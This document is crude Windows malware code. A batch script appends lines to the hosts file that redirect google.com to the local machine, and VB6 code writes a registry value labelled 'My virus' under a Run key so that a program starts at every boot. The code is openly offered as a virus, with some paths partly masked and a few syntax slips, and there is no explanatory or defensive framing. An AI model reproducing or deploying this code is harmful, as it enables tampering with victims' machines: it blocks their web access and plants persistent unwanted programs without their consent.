
@echo off
cd "C:\Windows\System32\Drivers\etc"
echo 127.0.0.1 google.com >> "Hosts"
echo 127.0.0.1 Google >> "Hosts

Option Explicit

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long

Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long

Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

Private Const REG_SZ = 1

Private Const LOCALMACHINE = &H80000002

Private Sub Command1_Click()

Dim InputValue As String

Dim nBufferKey As Long, nBufferSubKey As Long

RegCreateKey LOCALMACHINE, "SOFTWARE\JPRODUCTIONS", nBufferKey

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

InputValue = "c:\******s\system\Project12.exe"

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

RegSetValueEx nBufferSubKey, "My virus", 0, REG_SZ, InputValue, Len(InputValue)

End Sub